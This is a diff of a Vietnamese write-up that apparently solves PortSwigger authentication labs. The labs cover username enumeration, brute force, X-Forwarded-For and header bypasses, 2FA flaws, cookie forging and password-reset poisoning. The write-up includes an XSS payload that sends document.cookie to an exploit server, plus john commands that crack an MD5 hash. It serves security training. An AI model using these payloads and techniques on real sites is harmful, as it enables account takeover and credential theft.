@@ -10,16 +10,16 @@
 
 **Thực hiện**
 - Việc đầu tiên chúng ta cần làm là làm sao để tìm kiếm được `username` hợp lệ (`username enumeration`). Chúng ta sẽ dựa vào response HTTP để suy đoán.
-![alt text](image.png)
+![alt text](img/image.png)
 
 - Nếu `username` sai thì server trả về `Invalid username` -> Nếu mà đúng thì chắc hẳn sẽ có kiểu thông báo khác. Dùng `Intruder` để kiểm tra giả thiết.
-![alt text](image-1.png)
+![alt text](img/image-1.png)
 
 - Sau khi chạy tôi phát hiện ra `username:announcements` thì sẽ hiện như sau:
-![alt text](image-2.png)
+![alt text](img/image-2.png)
 
 - Vậy thì chúng đã có `username` việc còn lại là brute-force `password`:
-![alt text](image-3.png)
+![alt text](img/image-3.png)
 
 **Notes**
 Chúng ta có thể tận dụng Intrusder của Burp để làm hoặc có thể sử dụng script Python để làm. Ở bài lab này mọi thứ chỉ dừng lại ở case đơn giản. Tuy nhiên việc `username enumeration` là khá hay xảy ra vì tôi đã từng thấy nó ở một vài trang web trước đây.
@@ -31,11 +31,11 @@ ___
 **Thực hiện**
 - Bài lab này có ý tưởng giống bài lab trên tuy nhiên cách mà HTTP phản hồi có chú khác biệt nhỏ. Việc chúng ta là tìm ra sự khác biệt đó và thực hiện `username enumeration`.
 - Vẫn như bài trước ta sẽ bắt gói tin Burp rồi dùng Intruder để gửi nhiều gói tin với `username` khác nhau và theo dõi phản hồi.
-![setup match để trích xuất thông tin dễ dàng hơn](image-4.png)
-![alt text](image-5.png)
+![setup match để trích xuất thông tin dễ dàng hơn](img/image-4.png)
+![alt text](img/image-5.png)
 
 - Sự khác biệt ở đây là dấu `.`. Nếu đúng sẽ không có dấu chấm `Invalid username or password` và sai thì `Invalid username or password.`. Tiếp theo thì chúng ta sẽ dò password.
-![alt text](image-6.png)
+![alt text](img/image-6.png)
 
 **Lưu ý**
 Đôi khi do không cẩn thận trong việc đưa ra cảnh báo 1 cách thống nhất mà thông tin về `username` có thể bị lộ. Trong trường hợp này bản thân dev có thể đã lường trường việc khác nhau giữa HTTP response trả về nên đã để warning giống nhau. Tuy nhiên lại sơ sẩy quên mất dấu `.`.
@@ -67,18 +67,18 @@ ___
     2. Kiếm tra `password`: Nếu `username` đúng thì `password` sẽ được kiểm tra. Và chính vì độ dài của `password` sẽ làm tăng thời gian phản hồi
 
 - Ngoài ra trong quá trình xác định cơ chế xác thực hệ thống có xảy ra tình trạng như sau. Điều này là do server có cơ chế xác thực IP.
-![alt text](image-7.png)
+![alt text](img/image-7.png)
 
 - Theo gợi ý của Lab chúng ta dễ dàng bypass cơ chế xác thực IP này thông qua HTTP header. Cụ thể là `X-Forwarded-For`.
 > 🧪 Hint
 To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.
 
 - Giờ thì chúng ta có thể thực hiện tấn công rồi. Việc đầu tiên là xác định được username chính xác.
-![alt text](image-8.png)
-![alt text](image-9.png)
+![alt text](img/image-8.png)
+![alt text](img/image-9.png)
 
 - Chúng ta có `username: albuquerque` giờ thì tìm nốt password là xong. Brute-force như các bài lab trên.
-![alt text](image-10.png)
+![alt text](img/image-10.png)
 
 **Lưu ý**
 Bài lab này có yếu tố liên quan đến `X-Forwarded-For`, một header HTTP dùng để xác định IP gốc của client khi request đi qua proxy hoặc VPN. Nếu server tin tưởng giá trị trong header này mà không kiểm tra, attacker có thể giả mạo IP để bypass hệ thống kiểm soát truy cập hoặc giới hạn brute-force theo IP. Ngoài ra bài này ta có thể sử dụng chế độ `Cluster boom` của Intruder để bypass mà không cần chú ý đến timming vì nếu thành công sẽ trả về mã `302` còn lại thì không.
@@ -132,20 +132,20 @@ ___
 
 **Thực hiện**
 - Ở bài lab này chúng ta phải suy đoán được cơ chế của trang login. Thử gửi nhiều lần gói tin đăng nhập thì không bị có gì khác ngoài thông báo lỗi.
-![alt text](image-11.png)
+![alt text](img/image-11.png)
 
 - Thử brute-force `username` và `password` bằng Intruder luôn xem sao.
-![alt text](image-12.png)
+![alt text](img/image-12.png)
 
 - Để ý thì thấy với `user:activestat` thì thông báo lỗi như này. Vậy có thể đoán rằng với thông tin đúng thì sẽ hiện thị như vậy còn các thông báo khác thì là hiện thị `invalid` như bình thường.
-![alt text](image-13.png)
+![alt text](img/image-13.png)
 
 - Tiếp tục thử password với user vừa tìm được.
-![alt text](image-14.png)
-![alt text](image-15.png)
+![alt text](img/image-14.png)
+![alt text](img/image-15.png)
 
 - Hoàn thành
-![alt text](image-16.png)
+![alt text](img/image-16.png)
 
 **Notes**
 Cơ chế bài này có thể hiểu như sau: Với username đúng thì khi thử quá nhiều lần trước rồi thì khi đúng sẽ thông báo lock tài khoản. Sau đó tiếp tục thử đến password, nếu mà password đúng thì sẽ có gói tin redirect `302`. Để chính xác hơn thì ban đầu ta phải thực hiện gửi `user+pass` nhiều lần để đảm bảo lần sau thử đúng thì sẽ là thông báo lock tài khoản luôn.
@@ -156,13 +156,13 @@ ___
 
 **Thực hiện**
 - Bài lab này yêu cầu ta tìm mật khẩu của `carlos`. Bước đầu cũng sẽ là quan sát và suy đoán hành vi.
-![alt text](image-17.png)
+![alt text](img/image-17.png)
 
 - Thử gửi nhiều lần thì bị giới hạn. Thử bypass bằng HTTP header cũng không khả thi. Để ý lại gói tin `POST /login` thì thấy rằng data gửi đi dưới dạng file json -> điều này là khác so với các bài lab trước. Do đó có thể đây là thông tin hữu ích giúp giải bài lab này.
 - Json có thể gửi theo mảng, không biết liệu có thể gửi cả một mảng password vào trong json này không? Và cơ chế sử lí của nó như nào ?
 
 - Thử kiểm chứng giả thiết trên.
-![alt text](image-18.png)
+![alt text](img/image-18.png)
 
 - Có vẻ là đã thành công, mặc dù ta cũng chả biết chính xác password là gì. Ngoài ra đây là script convert từ wordlist ban đầu sang mảng json
 ```
@@ -195,13 +195,13 @@ ___
 
 **Thực hiện**
 - Cơ chế xác thực đây là OTP-code. Khi người dùng đăng nhập vào thì sẽ cần phải có mã OTP để nhập. Hãy thử với `wiener:peter` để xác định cơ chế.
-![alt text](image-27.png)
+![alt text](img/image-27.png)
 
 - Vô tình nhập sai mã OTP, bắt lại các gói tin burp để xem.
-![alt text](image-26.png)
+![alt text](img/image-26.png)
 
 - Để ý các gói tin. Thử thực hiện truy vấn tới `/my-account?id=wiener` thì không được. Tuy nhiên ta thử đăng nhập lại và chưa ấn mã OTP thì thấy đăng nhập được.
-![alt text](image-28.png)
+![alt text](img/image-28.png)
 
 
 - Dựa vào phản hồi ta đoán được rằng cơ chế xác thực OTP này hoàn toàn có thể bypass bằng việc không cần nhập mã. Đăng nhập với tài khoản `carlos` rồi thực hiện truy vấn tới `/my-account?id=carlos` để hoàn thành bài lab này.
@@ -215,22 +215,22 @@ ___
 
 **Thực hiện**
 - Đăng nhập bằng tài khoản hợp lệ. Quan sát các gói tin bắt được.
-![alt text](image-19.png)
+![alt text](img/image-19.png)
 
 - Để ý thấy sau khi gửi gói tin `POST /login` thì sẽ gửi tự động gói tin `GET /login2`. Ở đây để ý ở header `Cookie` có chứa `verify=wiener`. Một cơ chế an toàn không nên để lộ thông tin nhạy cảm như này, có lẽ cookie này giúp server biết được là user nào đang xác thực OTP.
-![alt text](image-20.png)
+![alt text](img/image-20.png)
  
 - Dựa theo giả thiết trên, ta có thể thay đổi `verify` mang giá trị `carlos` và dùng OTP gửi đến mail của `wiener` để xác thực ?
-![alt text](image-21.png)
+![alt text](img/image-21.png)
 
 - Mặc dù không thể xác thực đăng nhập, nhưng dựa vào gói tin trả về, ta có thể truy cập `login2` bằng `username:carlos` mà không cần biết mật khẩu.
-![alt text](image-22.png)
+![alt text](img/image-22.png)
 
 - Dựa vào phản hồi ta biết OTP có 4 chữ số -> Brute-force mã OTP 
-![alt text](image-23.png)
+![alt text](img/image-23.png)
 
 - Lấy session từ gói tin `HTTP Response` và thay vào browser. Load lại là chúng ta đã giải quyết xong bài lab
-![alt text](image-24.png)
+![alt text](img/image-24.png)
 
 **Notes**
 Lỗ hổng này xuất phát từ việc hệ thống chỉ dựa vào giá trị cookie để xác định người dùng, thay vì kiểm tra thông tin đăng nhập và session thực tế. Khi người dùng hoàn thành bước đăng nhập đầu tiên, hệ thống cấp cookie nhưng không xác minh lại danh tính khi nhập mã 2FA. Điều này cho phép kẻ tấn công chỉ cần thay đổi giá trị cookie thành tên tài khoản mục tiêu mà không cần mật khẩu. Nếu hệ thống không có cơ chế ràng buộc mã 2FA với session đăng nhập ban đầu, kẻ tấn công có thể lợi dụng lỗ hổng này để chiếm quyền truy cập tài khoản của người khác một cách dễ dàng.
@@ -255,25 +255,25 @@ ___
 
 - Tuy nhiên ở đây tôi sẽ dùng `Macro Recorder` để hoàn thành bài lab.
 - Setting Rule: 
-![alt text](image-29.png)
-![alt text](image-30.png)
-![alt text](image-31.png)
+![alt text](img/image-29.png)
+![alt text](img/image-30.png)
+![alt text](img/image-31.png)
 Việc lấy 3 gói tin như trên ảnh là giúp ta có thể lấy thông tin thay đổi sau mỗi lần. `GET /login` là có session, csrf. `POST /login` là tự động gửi gói tin đăng nhập. `GET /login2` là có session, csrf phục vụ cho `POST /login2`.
 
 - Test thử Macro:
-![alt text](image-32.png)
+![alt text](img/image-32.png)
 Nếu hiện ra gói tin phản hồi là thành công.
 
 - Sử dụng Intruder
-![alt text](image-33.png)
-![alt text](image-34.png)
-![alt text](image-35.png)
+![alt text](img/image-33.png)
+![alt text](img/image-34.png)
+![alt text](img/image-35.png)
 
 - OKE! Setup xong rồi giờ thì start attack thôi.
-![alt text](image-36.png)
+![alt text](img/image-36.png)
 
 - Thay session và hoàn thành bài lab.
-![alt text](image-37.png)
+![alt text](img/image-37.png)
 
 **Notes**
 Một cách khác là dùng Python để khai thác:
@@ -361,20 +361,20 @@ ___
 
 **Thực hiện**
 - Đăng nhập bằng tài khoản được cho để tìm hiểu về hành vi của server. Ở `POST /login` khi gửi đi kèm `stay-login:on` thì gói tin phản hồi có set một cái cookie đáng ngờ.
-![alt text](image-38.png)
+![alt text](img/image-38.png)
 
 - Nghiên cứu về cookie này `stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`. Theo suy đoán đây có thể là Base64 encode. Decode cookie này ta được `wiener:51dc30ddc473d43a6011e9ebba6ca770`
 - Theo đề bài gợi ý thì rất có thể chuỗi vô nghĩa đằng sau là mã hash của một chuỗi cố định nào đó. Sử dụng `hashid` tool để xác định thử. Theo suy đoán đây rất có thể là mã MD5.
-![alt text](image-39.png)
+![alt text](img/image-39.png)
 
 - Thử mã hóa password bằng MD5 ta được: `51dc30ddc473d43a6011e9ebba6ca770`. Vậy thì ta đoán được cơ chế tạo ra cookie `stay-logged`: `Base64(user||md5(password))`
-![alt text](image-40.png)
+![alt text](img/image-40.png)
 
 - Sau khi biết được cơ chế giờ ta sẽ tạo cookie `stay-logged` đối với user `carlos`. Sử dụng Intruder để brute-force. Việc setup như trong ảnh
-![alt text](image-41.png)
+![alt text](img/image-41.png)
 
 - Thực hiện brute-force và được kết quả.
-![alt text](image-42.png)
+![alt text](img/image-42.png)
 
 **Notes**
 Một số trang web sử dụng cookie để duy trì đăng nhập ngay cả khi người dùng đóng trình duyệt. Nếu cookie này được tạo từ các giá trị dễ đoán như username, timestamp hoặc password, kẻ tấn công có thể brute-force để chiếm quyền truy cập.  
@@ -389,24 +389,24 @@ ___
 **Thực hiện**
 - Theo mô tả bài lab ta sẽ phải tìm lỗ hổng `XSS`. Sau đó tiêm `XSS` và thực thi JavaScript để lấy được cookie của `carlos`. Giải mã tìm ra mật khẩu của `carlos`.
 - Đăng nhập với tài khoản được cấp. Và tìm kiếm lỗ hổng `XSS`. Thông thường `XSS` sẽ tồn tại ở các form bình luận.
-![alt text](image-43.png)
-![alt text](image-44.png)
+![alt text](img/image-43.png)
+![alt text](img/image-44.png)
 
 - Có thể xác nhận lỗ hổng XSS ở phần comment. Tiếp theo ta viết payload để tiêm và khi nạn nhận ấn vào ta sẽ có được cookie của nạn nhân.
 ```
 <script>document.location='https://exploit-0aa6005003acba6f81ea6b33010400eb.exploit-server.net/'+document.cookie</script>
 ```
-![alt text](image-45.png)
+![alt text](img/image-45.png)
 
 - Kiểm tra xem có nạn nhân nào dính chưa. Như này là đã thành công, ta lấy được `stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`. Decode Base64 ta được chuỗi `carlos:26323c16d5f4dabff3bb136f2460a943`.
-![alt text](image-46.png)
+![alt text](img/image-46.png)
 
 - Bước tiếp theo là crack mã hash `26323c16d5f4dabff3bb136f2460a943`. Theo bài lab trước ta biết đây có thể mã MD5 vì thế ta sử dụng các công cụ trên mạng để dò ngược. Ở đây tôi dùng `john` của kali luôn.
 > command
 echo "26323c16d5f4dabff3bb136f2460a943" > hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt
 
-![alt text](image-47.png)
+![alt text](img/image-47.png)
 
 - password: `onceuponatime`. Đăng nhập lại, xóa account để hoàn thành lab.
 
@@ -422,11 +422,11 @@ ___
 
 **Thực hiện**
 - Thử các tính năng, đặc biệt là tính năng đặt lại mật khẩu. Quan sát các gói tin trên Burp.
-![alt text](image-48.png)
+![alt text](img/image-48.png)
 
 - Ở trên param và data của gói tin POST đều có `temp-forgot-password-token=gdo38gkt6ydh42u9i4waug3j911055dm` điều này có lẽ là để phía Back End xác nhận đúng là đường link được gửi qua email. Tuy nhiên do xử lí sai cơ chế, tức là phía server chỉ kiểm tra token này có đúng là của nó sinh ra không và trong data của post có gửi đúng token đó không để xử lí. Điều này khiến ta có thể thay đổi username một cách tùy ý.
 - Thay đổi thành `carlos` và đổi password thành `1`. Truy cập bằng tài khoản `carlos` và hoàn thành lab.
-![alt text](image-49.png)
+![alt text](img/image-49.png)
 
 **Notes**
 Việc cung cấp tính năng đặt lại mật khẩu là cần thiết nhưng cũng tiềm ẩn nhiều rủi ro bảo mật nếu không được triển khai đúng cách. Một số phương pháp phổ biến có mức độ an toàn khác nhau:  
@@ -447,24 +447,24 @@ ___
 **Thực hiện**
 - Sau khi tìm hiểu về cơ chế hoạt động của web. Web sử dụng cơ chế `generated dynamically` để sinh ra `url password reset`. 
 - Cụ thể ở bài lab này cơ chế `generated dynamically` sử dụng `Host` và ghép với một phần `api` để truy vấn tới trang reset password
-![alt text](image-50.png)
-![alt text](image-51.png)
+![alt text](img/image-50.png)
+![alt text](img/image-51.png)
 
 - Thay đổi trường `Host` thì gây ra lỗi
-![alt text](image-52.png)
+![alt text](img/image-52.png)
 
 - Tuy nhiên sử dụng header `X-Forwardded-Host` để bypass thì thành công.
-![alt text](image-53.png)
-![alt text](image-54.png)
+![alt text](img/image-53.png)
+![alt text](img/image-54.png)
 
 - Thế thì ta có thể thao túng đường dẫn này tới con server của kẻ tấn công. Khi nạn nhân ấn vào link thì phía bên kẻ tấn công sẽ thấy được và biết được phần reset-token được thêm vào.
 - Thay đổi gói tin và thực hiện tấn công
-![alt text](image-55.png)
-![alt text](image-56.png)
+![alt text](img/image-55.png)
+![alt text](img/image-56.png)
 
 - `/forgot-password?temp-forgot-password-token=rtl6g1vwgc5bzgc95iyb7ny454nbg33e`. Giờ thì chỉ cần paste vào trang ban đầu và đổi password. Sau đó đăng nhập với `carlos` là xong.
-![alt text](image-57.png)
-![alt text](image-58.png)
+![alt text](img/image-57.png)
+![alt text](img/image-58.png)
 
 **Notes**
  Bài lab khai thác lỗ hổng khi hệ thống sử dụng giá trị `X-Forwarded-Host` hoặc `Host` không được xác thực để tạo URL đặt lại mật khẩu. Kẻ tấn công có thể thay đổi giá trị này để gửi nạn nhân đến một domain do họ kiểm soát, từ đó đánh cắp token đặt lại mật khẩu.  
@@ -478,13 +478,13 @@ ___
 
 **Thực hiện**
 - Thử chức năng đổi password với tài khoản `wiener`. Thử các trường hợp để xem phản hồi với mỗi trường hợp. Khi ta thử để `new-password-1=1&new-password-2=2` 2 cái khác nhau thì server trả về `New password not match`.
-![alt text](image-59.png)
+![alt text](img/image-59.png)
 
 - Thử thay tên `carlos` vào `wiener` thì ta lại được `current password is in correct`. Điều này có thể suy đoán được server đã bỏ quên việc xác thực ai đang sử dụng session này carlos or wiener. Server lần lượt kiểm tra xem `password` có đúng với `username` không rồi sau đó mới kiểm tra đến password được set mới.
-![alt text](image-60.png)
+![alt text](img/image-60.png)
 
 - Thực hiện brute-force password với user `carlos`. Ta sẽ biết thành công khi kết quả trả về là `New password not match` ( Do password hiện tại đúng thì server mới kiểm tra đến password mới)
-![alt text](image-61.png)
+![alt text](img/image-61.png)
 
 - Đăng nhập vào tài khoản `carlos` để hoàn thành bài lab.
 
